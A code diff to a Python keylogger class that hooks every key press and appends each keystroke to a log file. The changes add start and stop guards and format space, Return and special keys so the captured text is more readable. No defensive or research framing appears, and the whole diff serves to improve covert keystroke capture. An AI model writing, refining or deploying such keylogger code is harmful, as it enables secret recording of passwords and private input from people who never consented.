@@ -11,11 +11,17 @@ class Keylog:
         self.online = False
 
     def start_keylogger(self):
+        if self.online:
+            return
         self.online = True
         def OnKeyPress(event):
             with open(self.log_file, 'a') as f:
                 if event.Key == "Return":
                     event.Key = "\n"
+                if event.Key == "space":
+                    event.Key = " "
+                if len(event.Key) > 1:
+                    event.Key += " "
                 f.write('{}'.format(event.Key))
 
         self.new_hook.KeyDown = OnKeyPress
@@ -30,6 +36,8 @@ class Keylog:
                 f.write('\n{}'.format(msg))
 
     def stop_keylogger(self):
+        if not self.online:
+            return
         self.online = False
         self.new_hook.cancel()
 
